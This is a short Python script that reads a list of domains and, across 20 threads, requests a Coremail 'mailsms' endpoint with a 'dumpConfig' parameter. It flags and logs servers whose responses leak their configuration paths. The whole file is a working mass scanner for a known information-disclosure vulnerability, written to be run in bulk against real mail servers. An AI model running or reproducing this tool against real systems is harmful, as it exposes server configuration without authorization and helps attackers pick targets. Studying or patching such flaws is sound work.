# -*- coding:utf-8 -*-
# author:f0ngf0ng
import threading
import time
import requests
from queue import Queue

'''
运行之前的格式为：
http://x.x.x.x:3000
'''


total = 0
event = threading.Event()
event.set()
q = Queue(-1)
s = time.strftime('%Y-%m-%d',time.localtime(time.time()))

exitFlag = 0

class f0ng():
    def __init__(self,url,num):
        self.url = url
        self.num = num

    def fff(self):
        url = self.url

        try:
            url = "http://www." + url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
            r = requests.get(url)
            if (r.status_code != '404') and ("/home/coremail" in r.text):
                with open("coremail2.txt","a+") as f:
                    f.writelines(self.url)
                    print("此mailsms 存在配置信息泄露！: {0}".format(url))
            else:
                print("此mailsms 是安全的   by  http://src.ac.cn")

        except requests.exceptions.ConnectTimeout:
            # NETWORK_STATUS = False
            print("")

        except requests.exceptions.Timeout:
            # REQUEST_TIMEOUT = True
            print("")

        except requests.exceptions.ConnectionError:
            print("")


class myThread (threading.Thread):
    def __init__(self, q, num):
        threading.Thread.__init__(self)
        self.q = q
        self.num = num
        # print(q)
        print(num)

    def run(self):
        while event.is_set():
            if self.q.empty():
                break
            else:
                sql_spot = f0ng(self.q.get(),self.num)
                sql_spot.fff()


def scan_thread(q):
    thread_num = 20
    threads = []
    for num in range(1,thread_num+1):
        t = myThread(q,num)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

def open_urls():                                                                             #
    url_path = r'1.txt'
    f = open(url_path, 'r',encoding='utf-8')
    for each_line in f:
        q.put(each_line)
    return q

if __name__ == '__main__':
    open_urls()
    scan_thread(q)